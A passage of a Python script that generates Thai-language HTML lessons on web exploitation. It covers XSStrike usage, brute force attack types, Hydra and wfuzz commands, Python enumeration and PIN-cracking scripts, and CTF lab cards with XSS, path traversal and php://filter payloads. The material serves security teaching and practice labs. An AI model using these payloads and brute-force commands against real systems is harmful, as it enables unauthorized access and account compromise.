<td style="padding: 11px 20px; color: #cbd5e1; line-height: 1.6;">บังคับ Autofocus ให้เบราว์เซอร์โฟกัสช่องกรอกทันทีเพื่อสั่งรันฟังก์ชันโดยที่ผู้ใช้ไม่ต้องคลิก</td>
</tr>
<tr>
<td style="padding: 11px 20px; font-family: 'JetBrains Mono', monospace; font-weight: 700; color: #c084fc;"><code style="background: #040711; padding: 4px 8px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.06); color: #c084fc;">"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
<td style="padding: 11px 20px; color: #cbd5e1; line-height: 1.6;">เทคนิคปิด Attribute หรือ Tag เดิมที่ครอบอยู่ (Escape out of input attribute) ก่อนฉีดสคริปต์</td>
</tr>
</tbody>
</table>
</div>
</div>

<!-- XSStrike Masterclass -->
<div style="background: rgba(15, 23, 42, 0.95); border: 1px solid rgba(56, 189, 248, 0.35); border-radius: 14px; padding: 20px; margin-bottom: 10px;">
<div style="display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 10px; margin-bottom: 14px;">
<h4 style="margin: 0; color: #38bdf8; font-size: 1.05rem; font-weight: 800; display: flex; align-items: center; gap: 10px;">
<i class="fas fa-crosshairs"></i> 🛠️ XSStrike: Advanced XSS Detection Suite &amp; Fuzzer
</h4>
<span style="background: rgba(56, 189, 248, 0.2); color: #7dd3fc; font-family: monospace; font-size: 0.72rem; padding: 3px 10px; border-radius: 6px; border: 1px solid rgba(56, 189, 248, 0.4);">
TRYHACKME ROOM: XSSTRIKE
</span>
</div>

<p style="color: #cbd5e1; font-size: 0.86rem; line-height: 1.7; margin: 0 0 14px;">
<strong>XSStrike</strong> เป็นชุดเครื่องมือสแกนหาช่องโหว่ XSS ขั้นสูงที่พัฒนาโดย <strong>Somdev Sangwan</strong> จุดเด่นคือไม่ได้ใช้แค่การยิงเพย์โหลดสุ่มแบบดั้งเดิม แต่มีระบบ <strong>Intelligent Payload Generation</strong> ที่วิเคราะห์บริบท (Context Analysis) ของอินพุตในหน้าเว็บแบบแยกแยะไวยากรณ์ พร้อมทั้งระบบตรวจจับ WAF (WAF Detection), โหมด Fuzzer, และ Crawler ในตัว
</p>

<!-- Installation Commands -->
<div style="background: #040711; border: 1px solid rgba(255,255,255,0.08); border-radius: 8px; padding: 12px 16px; margin-bottom: 16px;">
<div style="color: #94a3b8; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 6px; font-weight: bold;">
ขั้นตอนการติดตั้ง XSStrike บน Kali Linux / Terminal
</div>
<pre style="margin: 0; font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; color: #4ade80;"><code>git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip3 install -r requirements.txt</code></pre>
</div>

<!-- Command Options Reference Table -->
<div style="overflow-x: auto; margin-bottom: 16px;">
<table style="width: 100%; border-collapse: collapse; font-size: 0.82rem;">
<thead>
<tr style="background: rgba(255,255,255,0.04); border-bottom: 1px solid rgba(255,255,255,0.08); font-size: 0.72rem; text-transform: uppercase;">
<th style="padding: 10px 14px; color: #38bdf8; width: 28%;">ออปชันคำสั่ง (Command Option)</th>
<th style="padding: 10px 14px; color: #94a3b8; width: 72%;">คำอธิบายการทำงาน (Description)</th>
</tr>
</thead>
<tbody>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 9px 14px; font-family: monospace; color: #38bdf8; font-weight: bold;">-u, --url &lt;URL&gt;</td>
<td style="padding: 9px 14px; color: #cbd5e1;">ระบุ URL ของเป้าหมายที่ต้องการตรวจสอบ (เช่น <code>-u "http://target.com/search?q=test"</code>)</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 9px 14px; font-family: monospace; color: #38bdf8; font-weight: bold;">--data "&lt;POST&gt;"</td>
<td style="padding: 9px 14px; color: #cbd5e1;">ระบุข้อมูลพารามิเตอร์สำหรับคำขอ HTTP POST (เช่น <code>--data "q=test&amp;id=1"</code>)</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 9px 14px; font-family: monospace; color: #38bdf8; font-weight: bold;">-v, --verbose</td>
<td style="padding: 9px 14px; color: #cbd5e1;">แสดงรายละเอียดการทำงานและขั้นตอนการทดสอบอย่างละเอียดในทุกขั้นตอน</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 9px 14px; font-family: monospace; color: #38bdf8; font-weight: bold;">--fuzzer</td>
<td style="padding: 9px 14px; color: #cbd5e1;">เปิดโหมด Fuzzer เพื่อทดสอบฟิลเตอร์ของเซิร์ฟเวอร์และค้นหาอักขระพิเศษที่อนุญาตให้ผ่านได้</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 9px 14px; font-family: monospace; color: #38bdf8; font-weight: bold;">--crawl</td>
<td style="padding: 9px 14px; color: #cbd5e1;">สั่งให้ระบบเริ่มไต่ลิงก์ (Web Crawling) จาก URL เป้าหมายเพื่อค้นหาทุกจุดที่มีพารามิเตอร์</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 9px 14px; font-family: monospace; color: #38bdf8; font-weight: bold;">--blind</td>
<td style="padding: 9px 14px; color: #cbd5e1;">ฉีดเพย์โหลดสำหรับทดสอบ Blind XSS (เช่น ส่งสัญญาณ Callback กลับเมื่อสคริปต์ทำงานในหลังบ้าน)</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 9px 14px; font-family: monospace; color: #38bdf8; font-weight: bold;">--timeout &lt;SEC&gt;</td>
<td style="padding: 9px 14px; color: #cbd5e1;">กำหนดระยะเวลารอคอยสูงสุดสำหรับแต่ละ HTTP Request ก่อนตัดการเชื่อมต่อ</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 9px 14px; font-family: monospace; color: #38bdf8; font-weight: bold;">--headers "&lt;HDR&gt;"</td>
<td style="padding: 9px 14px; color: #cbd5e1;">กำหนดค่า Custom HTTP Headers (เช่น <code>--headers "Authorization: Bearer token"</code>)</td>
</tr>
<tr>
<td style="padding: 9px 14px; font-family: monospace; color: #38bdf8; font-weight: bold;">--proxy "&lt;PROXY&gt;"</td>
<td style="padding: 9px 14px; color: #cbd5e1;">ส่งผ่านคำขอไปยัง Proxy Server (เช่น <code>--proxy "http://127.0.0.1:8080"</code> เพื่อเชื่อมต่อกับ Burp Suite)</td>
</tr>
</tbody>
</table>
</div>

<!-- Example Usage Commands -->
<div style="background: #02040a; border: 1px solid rgba(56, 189, 248, 0.2); border-radius: 8px; padding: 12px 16px;">
<div style="color: #38bdf8; font-size: 0.76rem; font-weight: bold; margin-bottom: 8px; text-transform: uppercase;">
ตัวอย่างคำสั่งใช้งานจริง (XSStrike Example Commands)
</div>
<pre style="margin: 0; font-family: 'JetBrains Mono', monospace; font-size: 0.74rem; color: #e2e8f0; line-height: 1.6;"><code># 1. สแกน GET Parameter พร้อมแสดงผลแบบ Verbose
python3 xsstrike.py -u "http://target.com/search?q=test" -v

# 2. สแกน POST Form และใช้ Fuzzer วิเคราะห์ตัวกรอง
python3 xsstrike.py -u "http://target.com/comment" --data "name=admin&amp;msg=hello" --fuzzer

# 3. สั่งไต่เว็บทั้งโดเมนเพื่อค้นหาช่องโหว่ XSS ทุกหน้า
python3 xsstrike.py -u "http://target.com" --crawl -l 3</code></pre>
</div>

</div>

</div>
</div>"""

clean_xss = '\n'.join([l.lstrip() for l in xss_html.split('\n')])

# =========================================================================
# SECTION: BRUTE FORCE ATTACKS & AUTOMATION (HYDRA, WFUZZ & PYTHON)
# =========================================================================
brute_html = f"""<!-- ========================================== -->
<!-- BRUTE FORCE ATTACKS MASTERCLASS (HYDRA, WFUZZ & PYTHON) -->
<!-- ========================================== -->
<div style="margin: 3.5rem auto 2rem; max-width: 1050px; background: linear-gradient(135deg, rgba(8, 14, 30, 0.98) 0%, rgba(10, 20, 35, 0.98) 100%); border: 1px solid rgba(56, 189, 248, 0.35); border-radius: 18px; box-shadow: 0 16px 45px rgba(0, 0, 0, 0.7), 0 0 35px rgba(56, 189, 248, 0.15); overflow: hidden;">
<div style="height: 4px; background: linear-gradient(90deg, #38bdf8, #818cf8, #a855f7, #10b981);"></div>

<div style="padding: 24px 28px 20px; border-bottom: 1px solid rgba(255, 255, 255, 0.08);">
<div style="display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 14px; margin-bottom: 16px;">
<div style="display: flex; align-items: center; gap: 14px;">
<div style="width: 56px; height: 56px; border-radius: 14px; background: radial-gradient(circle, rgba(56, 189, 248, 0.25) 0%, rgba(15, 23, 42, 0.9) 100%); border: 1.5px solid rgba(56, 189, 248, 0.55); display: flex; align-items: center; justify-content: center; font-size: 1.6rem; color: #38bdf8; box-shadow: 0 0 25px rgba(56, 189, 248, 0.35); flex-shrink: 0;">
<i class="fas fa-key"></i>
</div>
<div>
<h3 style="margin: 0; color: #ffffff; font-size: 1.35rem; font-weight: 800; letter-spacing: -0.02em;">
🔐 Brute Force Attacks — การโจมตีสุ่มรหัสผ่าน &amp; สคริปต์อัตโนมัติ (Hydra, Wfuzz &amp; Python)
</h3>
<span style="color: #94a3b8; font-size: 0.82rem;">Chapter 5: Web Exploitations &bull; Copyright &copy; 2026 By Wongyos Keardsri</span>
</div>
</div>
<div style="display: flex; gap: 8px; flex-wrap: wrap;">
<span style="background: rgba(56, 189, 248, 0.15); color: #7dd3fc; font-family: monospace; font-size: 0.72rem; font-weight: 800; padding: 4px 14px; border-radius: 20px; border: 1px solid rgba(56, 189, 248, 0.35);">
OWASP A07: AUTH FAILURES
</span>
<span style="background: rgba(239, 68, 68, 0.15); color: #fca5a5; font-family: monospace; font-size: 0.72rem; font-weight: 800; padding: 4px 14px; border-radius: 20px; border: 1px solid rgba(239, 68, 68, 0.35);">
CWE-307: IMPROPER RESTRICTION
</span>
<span style="background: rgba(16, 185, 129, 0.15); color: #6ee7b7; font-family: monospace; font-size: 0.72rem; font-weight: 800; padding: 4px 14px; border-radius: 20px; border: 1px solid rgba(16, 185, 129, 0.35);">
AUTOMATION SCRIPTING
</span>
</div>
</div>

<p style="color: #cbd5e1; font-size: 0.9rem; line-height: 1.75; margin: 0 0 14px;">
<strong>Brute Force Attack</strong> คือวิธีการทดสอบเจาะระบบแบบ <strong>"ลองผิดลองถูก" (Trial-and-Error)</strong> โดยการส่งค่าความเป็นไปได้ทั้งหมด เช่น รหัสผ่าน, รหัส PIN, โทเค็น, หรือชื่อผู้ใช้งาน เข้าสู่ระบบเป้าหมายอย่างต่อเนื่องด้วยความเร็วสูงจนกว่าจะพบชุดข้อมูลที่ถูกต้อง ช่องโหว่นี้เกิดขึ้นเมื่อระบบยืนยันตัวตน (Authentication Gateway) <strong>ขาดกลไก Rate Limiting, ไม่มีการจำกัดจำนวนครั้งที่ล็อกอินผิด (Account Lockout), และไม่มี CAPTCHA ป้องกันบอท</strong>
</p>
</div>

<!-- Animated SVG -->
<div style="padding: 22px 28px 16px;">
<div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px; flex-wrap: wrap; gap: 8px;">
<span style="color: #38bdf8; font-family: monospace; font-size: 0.84rem; font-weight: 800; text-transform: uppercase; letter-spacing: 0.08em; display: flex; align-items: center; gap: 8px;">
<i class="fas fa-project-diagram"></i> แผนภาพจำลองสถาปัตยกรรม BRUTE FORCE ATTACK PIPELINE (HIGH-SPEED SPRAYING)
</span>
<span style="background: rgba(56, 189, 248, 0.15); color: #7dd3fc; font-family: monospace; font-size: 0.7rem; font-weight: 800; padding: 2px 8px; border-radius: 4px;">
ANIMATED PIPELINE
</span>
</div>
{brute_svg}
</div>

<!-- 5 Types of Brute Force Table -->
<div style="padding: 0 28px 20px; background: rgba(5, 8, 18, 0.85);">
<h4 style="margin: 16px 0 14px; color: #38bdf8; font-size: 0.95rem; font-weight: 800; text-transform: uppercase; letter-spacing: 0.06em; display: flex; align-items: center; gap: 8px;">
<i class="fas fa-layer-group"></i> 5 รูปแบบหลักของการโจมตีแบบ Brute Force (5 Types of Brute Force Attacks)
</h4>

<div style="background: rgba(15, 23, 42, 0.9); border: 1px solid rgba(56, 189, 248, 0.35); border-radius: 12px; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.5); margin-bottom: 22px;">
<div style="overflow-x: auto;">
<table style="width: 100%; border-collapse: collapse; font-size: 0.84rem; text-align: left;">
<thead>
<tr style="background: rgba(255,255,255,0.02); border-bottom: 1px solid rgba(255,255,255,0.06); font-size: 0.72rem; text-transform: uppercase; letter-spacing: 0.05em;">
<th style="padding: 12px 20px; color: #38bdf8; width: 32%;">รูปแบบการโจมตี (Attack Type)</th>
<th style="padding: 12px 20px; color: #94a3b8; width: 68%;">ลักษณะการทำงานและตัวอย่างการใช้งาน (Description &amp; Scenario)</th>
</tr>
</thead>
<tbody>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 11px 20px; font-weight: bold; color: #38bdf8;">1. Simple Brute Force</td>
<td style="padding: 11px 20px; color: #cbd5e1; line-height: 1.6;">การสุ่มลองชุดตัวอักษรและตัวเลขทุกชุดความเป็นไปได้โดยตรง (เช่น 0000 ถึง 9999 หรือ a ถึง zzzz) มักใช้ได้ผลดีกับ PIN สั้นๆ หรือระบบที่รหัสผ่านมีความยาวไม่มาก</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 11px 20px; font-weight: bold; color: #38bdf8;">2. Dictionary Attack</td>
<td style="padding: 11px 20px; color: #cbd5e1; line-height: 1.6;">การใช้ไฟล์พจนานุกรมคำศัพท์และรหัสผ่านยอดนิยม (เช่น <code>rockyou.txt</code>, <code>10k-most-common.txt</code>) ยิงทดสอบเป็นลำดับ โดยอาศัยพฤติกรรมมนุษย์ที่มักตั้งรหัสผ่านเป็นคำที่มีความหมาย</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 11px 20px; font-weight: bold; color: #38bdf8;">3. Hybrid Brute Force</td>
<td style="padding: 11px 20px; color: #cbd5e1; line-height: 1.6;">การนำคำในพจนานุกรมมาผสมผสานด้วยกฎ (Rules) เช่น เติมตัวเลขปี พ.ศ. หรือสัญลักษณ์พิเศษต่อท้าย เช่น นำคำว่า <code>Admin</code> มาแปลงเป็น <code>Admin2026!</code> หรือ <code>@dm1n</code></td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 11px 20px; font-weight: bold; color: #38bdf8;">4. Credential Stuffing</td>
<td style="padding: 11px 20px; color: #cbd5e1; line-height: 1.6;">การนำคู่ Username/Password ที่หลุดรั่วไหลจากการถูกแฮกของเว็บไซต์อื่น (Data Breach Leaks) มาทดลองล็อกอินกับเว็บเป้าหมาย เนื่องจากผู้ใช้งานส่วนใหญ่มักใช้รหัสผ่านซ้ำกันข้ามเว็บ</td>
</tr>
<tr>
<td style="padding: 11px 20px; font-weight: bold; color: #38bdf8;">5. Reverse Brute Force</td>
<td style="padding: 11px 20px; color: #cbd5e1; line-height: 1.6;">การล็อกรหัสผ่านยอดนิยมเพียง 1 ค่า (เช่น <code>Password1234</code>) แล้วนำไปตระเวนล็อกอินกับ Username นับหมื่นบัญชี (Password Spraying) เพื่อหลบเลี่ยงระบบ Account Lockout</td>
</tr>
</tbody>
</table>
</div>
</div>

<!-- Hydra & Wfuzz Tools Section -->
<div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 16px; margin-bottom: 22px;">
<!-- Hydra Card -->
<div style="background: rgba(15, 23, 42, 0.95); border: 1px solid rgba(239, 68, 68, 0.35); border-radius: 12px; padding: 18px;">
<div style="color: #f87171; font-weight: 800; font-size: 0.95rem; margin-bottom: 8px; display: flex; align-items: center; gap: 8px;">
<i class="fas fa-dragon"></i> 🛠️ THC-Hydra: Multi-threaded Network &amp; Web Login Cracker
</div>
<p style="color: #cbd5e1; font-size: 0.82rem; line-height: 1.6; margin-bottom: 10px;">
เครื่องมือมาตรฐานสำหรับการเจาะระบบล็อกอิน รองรับทั้ง HTTP-GET, HTTP-POST-FORM, SSH, FTP, RDP ทำงานแบบ Multithread ความเร็วสูง
</p>
<pre style="background: #02040a; padding: 10px; border-radius: 6px; font-family: 'JetBrains Mono', monospace; font-size: 0.72rem; color: #e2e8f0; overflow-x: auto; margin-bottom: 8px;"><code># ไวยากรณ์สำหรับ HTTP POST Form:
hydra -l &lt;USER&gt; -P &lt;PASSLIST&gt; &lt;TARGET&gt; http-post-form \\
  "&lt;PATH&gt;:&lt;BODY&gt;:&lt;FAIL_STR&gt;" -t 16 -V

# ตัวอย่างคำสั่งจริง:
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com \\
  http-post-form "/login.php:user=^USER^&amp;pass=^PASS^:Invalid credentials"</code></pre>
<div style="color: #94a3b8; font-size: 0.76rem;">
<strong>Options สำคัญ:</strong> <code>-l</code> (ระบุ User), <code>-L</code> (ไฟล์ User), <code>-p</code> (ระบุ Pass), <code>-P</code> (ไฟล์ Pass), <code>-t</code> (จำนวน Thread)
</div>
</div>

<!-- Wfuzz Card -->
<div style="background: rgba(15, 23, 42, 0.95); border: 1px solid rgba(56, 189, 248, 0.35); border-radius: 12px; padding: 18px;">
<div style="color: #38bdf8; font-weight: 800; font-size: 0.95rem; margin-bottom: 8px; display: flex; align-items: center; gap: 8px;">
<i class="fas fa-bolt"></i> 🛠️ Wfuzz: Web Application Fuzzing Engine
</div>
<p style="color: #cbd5e1; font-size: 0.82rem; line-height: 1.6; margin-bottom: 10px;">
เครื่องมือ Fuzzer อเนกประสงค์ ใช้แทนที่จุดที่ต้องการโจมตีด้วยคีย์เวิร์ด <code>FUZZ</code> เหมาะสำหรับทั้งการเดารหัสผ่าน, ค้นหา Directory, และเจาะพารามิเตอร์
</p>
<pre style="background: #02040a; padding: 10px; border-radius: 6px; font-family: 'JetBrains Mono', monospace; font-size: 0.72rem; color: #e2e8f0; overflow-x: auto; margin-bottom: 8px;"><code># 1. ทดสอบ Login Form ซ่อนผลที่ Response Lines = 7:
wfuzz -c -z file,passwords.txt \\
  -d "user=admin&amp;pass=FUZZ" --hl 7 \\
  http://target.com/login.php

# 2. สแกนหาไดเรกทอรีที่ซ่อนอยู่ (ซ่อน Error 404):
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt \\
  --hc 404 http://target.com/FUZZ</code></pre>
<div style="color: #94a3b8; font-size: 0.76rem;">
<strong>Options สำคัญ:</strong> <code>-c</code> (แสดงสี), <code>-z</code> (ระบุ Payload/File), <code>-d</code> (POST Data), <code>--hc/--hl</code> (กรองซ่อนผลลัพธ์)
</div>
</div>
</div>

<!-- Python Automation Scripts Section -->
<h4 style="margin: 0 0 14px; color: #10b981; font-size: 0.95rem; font-weight: 800; text-transform: uppercase; letter-spacing: 0.06em; display: flex; align-items: center; gap: 8px;">
<i class="fab fa-python"></i> 3 สคริปต์ Python สำหรับการทดสอบอัตโนมัติ (Python Automation Scripts)
</h4>

<div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(310px, 1fr)); gap: 14px;">
<!-- Script 1 -->
<div style="background: #040711; border: 1px solid rgba(16, 185, 129, 0.25); border-radius: 10px; padding: 14px;">
<div style="color: #4ade80; font-weight: bold; font-size: 0.8rem; margin-bottom: 6px;"># 1. HTTP GET Status Enumeration (สำรวจห้องและสถานะ)</div>
<pre style="background: #02040a; padding: 8px 12px; border-radius: 6px; margin: 0; font-size: 0.72rem; color: #e2e8f0; overflow-x: auto;"><code>import requests

base_url = "http://target.com/room/"
for room_id in range(1, 101):
    url = f"{{base_url}}{{room_id}}"
    r = requests.get(url)
    if r.status_code == 200 and "Private" not in r.text:
        print(f"[+] Found Active Room: {{url}}")</code></pre>
<div style="color: #94a3b8; font-size: 0.74rem; margin-top: 6px;">วนลูปตรวจสอบ ID ห้องที่เปิดให้เข้าถึงได้โดยอัตโนมัติ</div>
</div>

<!-- Script 2 -->
<div style="background: #040711; border: 1px solid rgba(56, 189, 248, 0.25); border-radius: 10px; padding: 14px;">
<div style="color: #38bdf8; font-weight: bold; font-size: 0.8rem; margin-bottom: 6px;"># 2. HTTP POST Automation (ยิงสร้างข้อมูล / ส่งคำขออัตโนมัติ)</div>
<pre style="background: #02040a; padding: 8px 12px; border-radius: 6px; margin: 0; font-size: 0.72rem; color: #e2e8f0; overflow-x: auto;"><code>import requests

url = "http://target.com/api/create_page"
headers = {{"Authorization": "Bearer session_token_123"}}
payload = {{"title": "Audit Page", "content": "Testing payload"}}
r = requests.post(url, json=payload, headers=headers)
print(f"Status: {{r.status_code}}, Response: {{r.text}}")</code></pre>
<div style="color: #94a3b8; font-size: 0.74rem; margin-top: 6px;">ส่งคำขอ HTTP POST พร้อม Custom Header และ JSON Payload</div>
</div>

<!-- Script 3 -->
<div style="background: #040711; border: 1px solid rgba(251, 191, 36, 0.25); border-radius: 10px; padding: 14px;">
<div style="color: #fde047; font-weight: bold; font-size: 0.8rem; margin-bottom: 6px;"># 3. 4-Digit / PIN Lock Cracker (สคริปต์แคร็กรหัส PIN)</div>
<pre style="background: #02040a; padding: 8px 12px; border-radius: 6px; margin: 0; font-size: 0.72rem; color: #e2e8f0; overflow-x: auto;"><code>import requests

target_url = "http://target.com/vault/unlock"
print("[*] Starting PIN Brute Force (0000-9999)...")

for pin in range(10000):
    pin_str = f"{{pin:04d}}"
    r = requests.post(target_url, data={{"pin": pin_str}})
    if "Invalid" not in r.text and "Incorrect" not in r.text:
        print(f"\\n[+] CRACKED! PIN: {{pin_str}}")
        print(f"[+] Flag / Response: {{r.text}}")
        break
    if pin % 1000 == 0:
        print(f"[*] Trying: {{pin_str}}...", end="\\r")</code></pre>
<div style="color: #94a3b8; font-size: 0.74rem; margin-top: 6px;">สุ่มลองเลขรหัส PIN 0000 ถึง 9999 จนกว่าระบบจะตอบรับผ่าน</div>
</div>
</div>

</div>
</div>"""

clean_brute = '\n'.join([l.lstrip() for l in brute_html.split('\n')])

# =========================================================================
# OBJECTIVE CARDS FOR THE 7 PRACTICE CHALLENGES
# =========================================================================

# Lab LFI-1 (Challenge 30)
card_30 = """<div style="background:#070a13;border:1px solid rgba(251,191,36,0.3);border-radius:12px;padding:22px;margin:2rem auto 0.5rem;max-width:100%;box-shadow:0 8px 24px rgba(251,191,36,0.12);position:relative;overflow:hidden;box-sizing:border-box;">
  <div style="position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,#fbbf24,#f59e0b);"></div>
  <div style="display:flex;align-items:flex-start;gap:14px;flex-wrap:wrap;">
    <span style="font-size:1.5rem;">📁</span>
    <div style="flex:1;">
      <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:8px;">
        <span style="font-size:1rem;font-weight:800;color:#ffffff;">Lab LFI-1: Local File Inclusion (Simple Case)</span>
        <span style="background:rgba(251,191,36,0.2);border:1px solid rgba(251,191,36,0.4);border-radius:16px;padding:2px 10px;font-size:0.73rem;color:#fde047;">⭐⭐ Easy</span>
      </div>
      <div style="font-size:0.75rem;color:rgba(255,255,255,0.35);font-family:monospace;margin-bottom:8px;">LFI Vulnerability — Unsanitized Path Traversal</div>
      <p style="font-size:0.87rem;color:#94a3b8;line-height:1.65;margin:0;">เว็บใช้ <code style='color:#fbbf24;'>include($_GET['page'])</code> โดยตรง ไม่มีการ validate path ทำให้สามารถใช้ Path Traversal (<code style='color:#fbbf24;'>../../../../flag.txt</code>) เพื่ออ่านไฟล์ลับบน server</p>
    </div>
  </div>
</div>"""

# Lab LFI-2 (Challenge 31)
card_31 = """<div style="background:#070a13;border:1px solid rgba(168,85,247,0.3);border-radius:12px;padding:22px;margin:2rem auto 0.5rem;max-width:100%;box-shadow:0 8px 24px rgba(168,85,247,0.12);position:relative;overflow:hidden;box-sizing:border-box;">
  <div style="position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,#a855f7,#9333ea);"></div>
  <div style="display:flex;align-items:flex-start;gap:14px;flex-wrap:wrap;">
    <span style="font-size:1.5rem;">🔓</span>
    <div style="flex:1;">
      <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:8px;">
        <span style="font-size:1rem;font-weight:800;color:#ffffff;">Lab LFI-2: LFI — PHP Filter Wrapper Bypass</span>
        <span style="background:rgba(168,85,247,0.2);border:1px solid rgba(168,85,247,0.4);border-radius:16px;padding:2px 10px;font-size:0.73rem;color:#c084fc;">⭐⭐⭐ Medium</span>
      </div>
      <div style="font-size:0.75rem;color:rgba(255,255,255,0.35);font-family:monospace;margin-bottom:8px;">Stream Wrapper Bypass — Source Code Disclosure</div>
      <p style="font-size:0.87rem;color:#94a3b8;line-height:1.65;margin:0;">เว็บพยายามบล็อก <code style='color:#c084fc;'>..</code> แต่ลืมบล็อก PHP Stream Wrapper ให้ใช้ <code style='color:#c084fc;'>php://filter/convert.base64-encode/resource=secret_config</code> เพื่อดึง Source Code ที่ซ่อน flag</p>
    </div>
  </div>
</div>"""

# Lab XSS-1 (Challenge 25)
card_25 = """<div style="background:#070a13;border:1px solid rgba(56,189,248,0.3);border-radius:12px;padding:22px;margin:2rem auto 0.5rem;max-width:100%;box-shadow:0 8px 24px rgba(56,189,248,0.12);position:relative;overflow:hidden;box-sizing:border-box;">
  <div style="position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,#38bdf8,#0284c7);"></div>
  <div style="display:flex;align-items:flex-start;gap:14px;flex-wrap:wrap;">
    <span style="font-size:1.5rem;">🪞</span>
    <div style="flex:1;">
      <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:8px;">
        <span style="font-size:1rem;font-weight:800;color:#ffffff;">Lab XSS-1: Reflected XSS — Cookie Theft</span>
        <span style="background:rgba(56,189,248,0.2);border:1px solid rgba(56,189,248,0.4);border-radius:16px;padding:2px 10px;font-size:0.73rem;color:#7dd3fc;">⭐⭐ Easy</span>
      </div>
      <div style="font-size:0.75rem;color:rgba(255,255,255,0.35);font-family:monospace;margin-bottom:8px;">Client-side Script Injection — URL Query Reflection</div>
      <p style="font-size:0.87rem;color:#94a3b8;line-height:1.65;margin:0;">เว็บมีช่องค้นหาที่นำ input จาก URL parameter <code style='color:#38bdf8;'>?q=</code> มาแสดงผลโดยไม่ sanitize ให้ฉีด <code style='color:#38bdf8;'>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> เพื่ออ่านค่า Cookie ที่เก็บ flag ไว้</p>
    </div>
  </div>
</div>"""

# Lab XSS-2 (Challenge 26)
card_26 = """<div style="background:#070a13;border:1px solid rgba(236,72,153,0.3);border-radius:12px;padding:22px;margin:2rem auto 0.5rem;max-width:100%;box-shadow:0 8px 24px rgba(236,72,153,0.12);position:relative;overflow:hidden;box-sizing:border-box;">
  <div style="position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,#ec4899,#db2777);"></div>
  <div style="display:flex;align-items:flex-start;gap:14px;flex-wrap:wrap;">
    <span style="font-size:1.5rem;">💾</span>
    <div style="flex:1;">
      <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:8px;">
        <span style="font-size:1rem;font-weight:800;color:#ffffff;">Lab XSS-2: Stored XSS — Persistent Script Injection</span>
        <span style="background:rgba(236,72,153,0.2);border:1px solid rgba(236,72,153,0.4);border-radius:16px;padding:2px 10px;font-size:0.73rem;color:#f472b6;">⭐⭐⭐ Medium</span>
      </div>
      <div style="font-size:0.75rem;color:rgba(255,255,255,0.35);font-family:monospace;margin-bottom:8px;">Database Stored Execution — Persistent Threat</div>
      <p style="font-size:0.87rem;color:#94a3b8;line-height:1.65;margin:0;">เว็บเว็บบอร์ดเก็บข้อความลงในฐานข้อมูลและแสดงผลโดยไม่ escape HTML ให้โพสต์สคริปต์ <code style='color:#f472b6;'>&lt;script&gt;alert(secretFlag)&lt;/script&gt;</code> เพื่ออ่านค่าตัวแปรลับ</p>
    </div>
  </div>
</div>"""

# Lab XSS-3 (Challenge 27)
card_27 = """<div style="background:#070a13;border:1px solid rgba(168,85,247,0.3);border-radius:12px;padding:22px;margin:2rem auto 0.5rem;max-width:100%;box-shadow:0 8px 24px rgba(168,85,247,0.12);position:relative;overflow:hidden;box-sizing:border-box;">
  <div style="position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,#a855f7,#7c3aed);"></div>
  <div style="display:flex;align-items:flex-start;gap:14px;flex-wrap:wrap;">
    <span style="font-size:1.5rem;">🌐</span>
    <div style="flex:1;">
      <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:8px;">
        <span style="font-size:1rem;font-weight:800;color:#ffffff;">Lab XSS-3: DOM-Based XSS — URL Hash Injection</span>
        <span style="background:rgba(168,85,247,0.2);border:1px solid rgba(168,85,247,0.4);border-radius:16px;padding:2px 10px;font-size:0.73rem;color:#c084fc;">⭐⭐⭐ Medium</span>
      </div>
      <div style="font-size:0.75rem;color:rgba(255,255,255,0.35);font-family:monospace;margin-bottom:8px;">Client DOM Manipulation — Fragment Vulnerability</div>
      <p style="font-size:0.87rem;color:#94a3b8;line-height:1.65;margin:0;">หน้าเว็บอ่านค่าจาก <code style='color:#c084fc;'>location.hash</code> แล้วนำไปเขียนลง DOM ด้วย <code style='color:#c084fc;'>innerHTML</code> โดยไม่ผ่านเซิร์ฟเวอร์ ให้ฝัง payload <code style='color:#c084fc;'>#&lt;img src=x onerror=alert(FLAG)&gt;</code></p>
    </div>
  </div>
</div>"""

# Lab BRUTE-1 (Challenge 28)
